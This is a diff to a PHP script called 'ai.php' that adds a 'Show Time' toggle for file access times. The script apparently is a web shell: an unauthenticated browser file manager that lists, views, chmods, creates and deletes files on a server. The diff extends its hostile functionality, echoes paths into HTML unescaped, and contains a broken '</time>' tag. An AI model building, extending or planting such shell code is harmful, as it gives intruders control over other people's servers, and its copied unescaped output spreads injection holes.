@@ -170,10 +170,11 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 		}
 		
 		echo '<td><form method="POST" action="?option&path='.$path.'">
-					<select name="new">
-					<option value="">New</option>
-					<option value="file">File</option>
-					<option value="folder">Folder</option>
+					<select name="other">
+					<option value="">Other</option>
+					<option value="stime">Show Time</time>
+					<option value="file">Create File</option>
+					<option value="folder">Create Folder</option>
 					</select>
 					<input type="submit" value=">">
 					</form></td>';
@@ -189,7 +190,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 
 		}
 		
-		//create new folder/file
+		//action other
 		elseif(isset($_POST['newgofile'])) {
 				$new = $_POST['newfile'];
 				
@@ -215,20 +216,32 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
       }
       echo("<script>location.href = '/ai.php?path=$path';</script>");
 		}
-		elseif(isset($_GET['option']) && $_POST['new'] == 'file' ) {
+		elseif(isset($_GET['option']) && $_POST['other'] == 'file' ) {
 				echo '<form method="POST" action="">New File : 
 				<input name="newfile" type="text" size="20" value="'.$path.'" />
 				<input type="hidden" name="path" value="'.$_POST['path'].'">
 				<input type="submit" name="newgofile" value="Go" /></form>';
 		}
-		elseif(isset($_GET['option']) && $_POST['new'] == 'folder' ) {
+		elseif(isset($_GET['option']) && $_POST['other'] == 'folder' ) {
 				echo '<form method="POST" action="">New Folder : 
 				<input name="newfolder" type="text" size="20" value="'.$path.'" />
 				<input type="hidden" name="path" value="'.$_POST['path'].'">
 				<input type="submit" name="newgofolder" value="Go" /></form>';
 		}
+		elseif(isset($_GET['option']) && $_POST['other'] == 'stime' ) {
+				$vartime = $_SESSION['stime'];
+				if ($vartime == '') {
+						$_SESSION['stime'] = 'oke';
+						echo "<script>alert('tekan ini lagi jika ingin hapus time');</script>";
+				
+				} else {
+						unset($_SESSION['stime']);
+				}
+				echo("<script>location.href = '/ai.php?path=".$_SESSION['path']."';</script>");
+				
+		}
 		
-		//action file
+		//action filemanager
 		elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    		echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
   		 if($_POST['opt'] == 'chmod'){
@@ -326,6 +339,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 		foreach($scandir as $dir){
 					if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 				
+					//show dir
 					echo '<tr>
 					<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
 					<td><center>--</center></td>
@@ -365,11 +379,22 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 					}else{
 								$size = $size.' KB';
 					}
-
-					echo '<tr>
-					<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
-					<td><center>'.$size.'</center></td>
-					<td><center>';
+					
+					//show file
+					if ($_SESSION['stime'] == '') {
+							echo '<tr>
+							<td>	<a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+							<td><center>'.$size.'</center></td>
+							<td><center>';
+				
+					} else {
+							$time = date("d-m-Y H:i:s", fileatime($path.'/'.$file));
+							echo '<tr>
+							<td>'.$time.'   <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+							<td><center>'.$size.'</center></td>
+							<td><center>';
+					}
+					
 											
 					if(is_writable($path.'/'.$file)) echo '<font color="green">';
 					elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
